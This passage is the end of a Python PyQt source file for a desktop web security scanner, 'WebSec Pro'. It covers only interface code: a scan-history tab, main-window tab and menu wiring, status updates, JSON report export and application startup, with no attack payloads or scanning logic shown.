    def __init__(self, parent=None):
        super().__init__(parent)
        self._sessions = []
        self._build_ui()

    def _build_ui(self):
        layout = QVBoxLayout(self)
        layout.setContentsMargins(8, 8, 8, 8)
        layout.setSpacing(8)

        top_row = QHBoxLayout()
        top_row.addWidget(QLabel("SCAN HISTORY"))
        self.btn_clear_hist = QPushButton("CLEAR HISTORY")
        self.btn_clear_hist.clicked.connect(self._clear)
        self.btn_export = QPushButton("EXPORT JSON")
        self.btn_export.clicked.connect(self._export)
        top_row.addStretch()
        top_row.addWidget(self.btn_export)
        top_row.addWidget(self.btn_clear_hist)
        layout.addLayout(top_row)

        self.hist_tree = QTreeWidget()
        self.hist_tree.setHeaderLabels(["Target", "Time", "Requests", "Vulns", "Critical", "High"])
        self.hist_tree.header().setSectionResizeMode(0, QHeaderView.Stretch)
        self.hist_tree.setAlternatingRowColors(True)
        layout.addWidget(self.hist_tree)

    def add_session(self, target, req_count, vuln_counts):
        self._sessions.append({
            "target": target, "time": datetime.now().isoformat(),
            "requests": req_count, "vulns": vuln_counts
        })
        total = sum(vuln_counts.values())
        crit = vuln_counts.get("CRITICAL", 0)
        high = vuln_counts.get("HIGH", 0)
        item = QTreeWidgetItem([
            target,
            datetime.now().strftime("%Y-%m-%d %H:%M"),
            str(req_count),
            str(total),
            str(crit),
            str(high),
        ])
        if crit > 0:
            item.setForeground(4, QColor(SEVERITY["CRITICAL"]))
        if high > 0:
            item.setForeground(5, QColor(SEVERITY["HIGH"]))
        self.hist_tree.insertTopLevelItem(0, item)

    def _clear(self):
        self.hist_tree.clear()
        self._sessions.clear()

    def _export(self):
        path, _ = QFileDialog.getSaveFileName(self, "Export History", "scan_history.json", "JSON (*.json)")
        if path:
            with open(path, "w") as f:
                json.dump(self._sessions, f, indent=2)


# ─── MAIN WINDOW ─────────────────────────────────────────────────────────────
class MainWindow(QMainWindow):
    def __init__(self):
        super().__init__()
        self.setWindowTitle("WebSec Pro  —  Web Security Scanner")
        self.resize(1400, 900)
        self._build_menu()
        self._build_toolbar()
        self._build_central()
        self._build_status_bar()
        self.setStyleSheet(DARK_STYLESHEET)
        self._scan_req_count = 0
        self._scan_vuln_counts = {}
        self._scan_target = ""

    def _build_menu(self):
        mb = self.menuBar()
        file_menu = mb.addMenu("File")
        file_menu.addAction("New Session", self._new_session)
        file_menu.addAction("Export Report...", self._export_report)
        file_menu.addSeparator()
        file_menu.addAction("Exit", self.close)

        scan_menu = mb.addMenu("Scan")
        scan_menu.addAction("Start Scan", lambda: self.tabs.setCurrentWidget(self.scanner_tab))
        scan_menu.addAction("Stop Scan",  lambda: self.scanner_tab.stop_scan())

        tools_menu = mb.addMenu("Tools")
        tools_menu.addAction("Open Repeater", lambda: self.tabs.setCurrentWidget(self.repeater_tab))
        tools_menu.addAction("Open Exploitation", lambda: self.tabs.setCurrentWidget(self.exploit_tab))

        help_menu = mb.addMenu("Help")
        help_menu.addAction("About", self._show_about)

    def _build_toolbar(self):
        tb = self.addToolBar("Main")
        tb.setMovable(False)
        tb.setIconSize(QSize(16, 16))

        self.tb_url = QLineEdit()
        self.tb_url.setPlaceholderText("https://target.com  — Enter URL and press Scan")
        self.tb_url.setMinimumWidth(400)
        self.tb_url.returnPressed.connect(self._quick_scan)
        tb.addWidget(self.tb_url)

        btn_scan = QPushButton("▶  SCAN")
        btn_scan.setObjectName("btnSuccess")
        btn_scan.clicked.connect(self._quick_scan)
        tb.addWidget(btn_scan)
        tb.addSeparator()

        label = QLabel("  WebSec Pro  ")
        label.setObjectName("titleLabel")
        tb.addWidget(label)

    def _build_central(self):
        self.tabs = QTabWidget()
        self.tabs.setTabPosition(QTabWidget.North)

        # Scanner tab
        self.scanner_tab = ScannerTab()
        self.scanner_tab.sig_http_entry.connect(self._on_http_entry)
        self.scanner_tab.sig_vuln.connect(self._on_vuln)
        self.scanner_tab.worker_done_signal_hack = self.scanner_tab.progress  # for history
        self.scanner_tab.progress.valueChanged.connect(self._on_scan_progress)
        self.tabs.addTab(self.scanner_tab, "⚙  SCANNER")

        # Traffic tab
        self.traffic_tab = TrafficTab()
        self.traffic_tab.sig_send_to_repeater.connect(self._send_to_repeater)
        self.tabs.addTab(self.traffic_tab, "🌐  TRAFFIC")

        # Vuln tab
        self.vuln_tab = VulnTab()
        self.vuln_tab.sig_send_to_exploit.connect(self._send_to_exploit)
        self.tabs.addTab(self.vuln_tab, "🔴  VULNERABILITIES")

        # Repeater / Manual
        self.repeater_tab = RepeaterTab()
        self.tabs.addTab(self.repeater_tab, "🔁  REPEATER")

        # Exploit tab
        self.exploit_tab = ExploitTab()
        self.tabs.addTab(self.exploit_tab, "⚡  EXPLOITATION")

        # History tab
        self.history_tab = HistoryTab()
        self.tabs.addTab(self.history_tab, "📋  HISTORY")

        self.setCentralWidget(self.tabs)

    def _build_status_bar(self):
        self.status_bar = self.statusBar()
        self.status_label = QLabel("Ready  —  WebSec Pro v1.0")
        self.status_bar.addWidget(self.status_label)
        self.status_requests = QLabel("Requests: 0")
        self.status_bar.addPermanentWidget(self.status_requests)
        self.status_vulns = QLabel("Vulns: 0")
        self.status_bar.addPermanentWidget(self.status_vulns)

    # ── Event handlers ─────────────────────────────────────────────────────

    def _on_http_entry(self, entry: HttpEntry):
        self.traffic_tab.add_entry(entry)
        self._scan_req_count += 1
        self.status_requests.setText(f"Requests: {self._scan_req_count}")

    def _on_vuln(self, vuln: VulnEntry):
        self.vuln_tab.add_vuln(vuln)
        self._scan_vuln_counts[vuln.severity] = self._scan_vuln_counts.get(vuln.severity, 0) + 1
        total = sum(self._scan_vuln_counts.values())
        self.status_vulns.setText(f"Vulns: {total}")

        # Update tab label
        self.tabs.setTabText(2, f"🔴  VULNERABILITIES  ({total})")

    def _on_scan_progress(self, val):
        if val == 100:
            target = self.scanner_tab.url_input.text()
            self.history_tab.add_session(
                target, self._scan_req_count, dict(self._scan_vuln_counts)
            )
            self.status_label.setText(
                f"Scan complete — {self._scan_req_count} requests, "
                f"{sum(self._scan_vuln_counts.values())} vulnerabilities"
            )
        elif val > 0:
            self.status_label.setText(f"Scanning... {val}%")

    def _send_to_repeater(self, entry: HttpEntry):
        self.repeater_tab.load_entry(entry)
        self.tabs.setCurrentWidget(self.repeater_tab)
        self.status_label.setText(f"Sent to Repeater: {entry.method} {entry.url}")

    def _send_to_exploit(self, vuln: VulnEntry):
        self.exploit_tab.load_vuln(vuln)
        self.tabs.setCurrentWidget(self.exploit_tab)
        self.status_label.setText(f"Sent to Exploit: {vuln.vuln_type} @ {vuln.url}")

    def _quick_scan(self):
        url = self.tb_url.text().strip()
        if url:
            self.scanner_tab.url_input.setText(url)
            self.tabs.setCurrentWidget(self.scanner_tab)
            self._scan_req_count = 0
            self._scan_vuln_counts = {}
            self.tabs.setTabText(2, "🔴  VULNERABILITIES")
            self.scanner_tab.start_scan()

    def _new_session(self):
        self._scan_req_count = 0
        self._scan_vuln_counts = {}
        self.traffic_tab._clear_traffic()
        self.vuln_tab.vuln_table.setRowCount(0)
        self.vuln_tab.vuln_table.vulns.clear()
        self.vuln_tab._vulns.clear()
        self.vuln_tab.summary_bar.setText("No vulnerabilities found yet. Run a scan first.")
        self.tabs.setTabText(2, "🔴  VULNERABILITIES")
        self.status_label.setText("New session — ready")

    def _export_report(self):
        vulns = self.vuln_tab._vulns
        if not vulns:
            QMessageBox.information(self, "Export", "No vulnerabilities to export.")
            return
        path, _ = QFileDialog.getSaveFileName(self, "Export Report", "report.json", "JSON (*.json)")
        if path:
            data = [
                {
                    "type": v.vuln_type, "severity": v.severity,
                    "url": v.url, "parameter": v.parameter,
                    "description": v.description, "payload": v.payload,
                    "evidence": v.evidence, "timestamp": v.timestamp.isoformat(),
                }
                for v in vulns
            ]
            with open(path, "w") as f:
                json.dump(data, f, indent=2)
            QMessageBox.information(self, "Export", f"Exported {len(data)} findings to {path}")

    def _show_about(self):
        QMessageBox.about(self, "About WebSec Pro",
            "<b>WebSec Pro v1.0</b><br><br>"
            "Professional Web Security Scanner<br><br>"
            "Features:<br>"
            "• Web crawler with HTTP traffic logging<br>"
            "• Multi-module vulnerability scanner<br>"
            "• Manual request repeater<br>"
            "• Automated exploitation engine<br>"
            "• Scan history & JSON export<br><br>"
            "<i>For authorized security testing only.</i>"
        )


# ─── ENTRY POINT ─────────────────────────────────────────────────────────────
def main():
    # High DPI support
    QApplication.setAttribute(Qt.AA_EnableHighDpiScaling, True)
    QApplication.setAttribute(Qt.AA_UseHighDpiPixmaps, True)

    app = QApplication(sys.argv)
    app.setStyle(QStyleFactory.create("Fusion"))

    # Set a base dark palette for widgets that ignore stylesheets
    palette = QPalette()
    palette.setColor(QPalette.Window,          QColor("#0a0e1a"))
    palette.setColor(QPalette.WindowText,      QColor("#c8d8e8"))
    palette.setColor(QPalette.Base,            QColor("#080c18"))
    palette.setColor(QPalette.AlternateBase,   QColor("#0d1220"))
    palette.setColor(QPalette.ToolTipBase,     QColor("#0a0e1a"))
    palette.setColor(QPalette.ToolTipText,     QColor("#c8d8e8"))
    palette.setColor(QPalette.Text,            QColor("#c8d8e8"))
    palette.setColor(QPalette.Button,          QColor("#0f2040"))
    palette.setColor(QPalette.ButtonText,      QColor("#c8d8e8"))
    palette.setColor(QPalette.BrightText,      QColor("#ffffff"))
    palette.setColor(QPalette.Link,            QColor("#00d4ff"))
    palette.setColor(QPalette.Highlight,       QColor("#1a3a5f"))
    palette.setColor(QPalette.HighlightedText, QColor("#00d4ff"))
    app.setPalette(palette)

    win = MainWindow()
    win.show()

    # Splash message
    win.status_label.setText("WebSec Pro v1.0  —  Enter a target URL and press SCAN to begin")

    sys.exit(app.exec_())


if __name__ == "__main__":
    main()